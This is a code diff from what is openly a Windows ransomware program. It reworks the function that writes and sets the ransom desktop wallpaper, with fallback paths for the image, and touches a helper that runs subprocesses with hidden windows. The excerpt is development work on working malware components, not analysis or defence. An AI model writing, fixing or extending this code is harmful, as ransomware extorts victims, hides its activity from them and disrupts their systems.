@@ -47,13 +47,32 @@ def amiroot():
 def change_wallpaper():
     """Change desktop wallpaper on Windows"""
     try:
-        # Save the ransomware image
-        wallpaper_path = os.path.join(variables.ransomware_path, "img.png")
-        os.makedirs(os.path.dirname(wallpaper_path), exist_ok=True)
+        # Check if we have base64 encoded image in variables
+        if hasattr(variables, 'img') and variables.img:
+            # Save the ransomware image from base64
+            wallpaper_path = os.path.join(variables.ransomware_path, "img.png")
+            os.makedirs(os.path.dirname(wallpaper_path), exist_ok=True)
+            
+            with open(wallpaper_path, 'wb') as f:
+                f.write(base64.b64decode(variables.img))
+        else:
+            # Look for existing image file in current directory
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            wallpaper_path = os.path.join(script_dir, "img.png")
+            
+            # If not found in script directory, use the path from variables
+            if not os.path.exists(wallpaper_path):
+                wallpaper_path = variables.img_path
+                
+                # If still not found, look in current working directory
+                if not os.path.exists(wallpaper_path):
+                    wallpaper_path = os.path.join(os.getcwd(), "img.png")
         
-        with open(wallpaper_path, 'wb') as f:
-            f.write(base64.b64decode(variables.img))
-        
+        # Verify the image exists before trying to set it
+        if not os.path.exists(wallpaper_path):
+            print(f"[-] Wallpaper image not found at: {wallpaper_path}")
+            return False
+            
         # Use absolute path
         abs_path = os.path.abspath(wallpaper_path)
         
@@ -89,7 +108,7 @@ def change_wallpaper():
     except Exception as e:
         print(f"[-] Failed to change wallpaper: {str(e)}")
         return False
-
+    
 def run_subprocess(command):
     """Run a subprocess with hidden window on Windows"""
     startupinfo = None
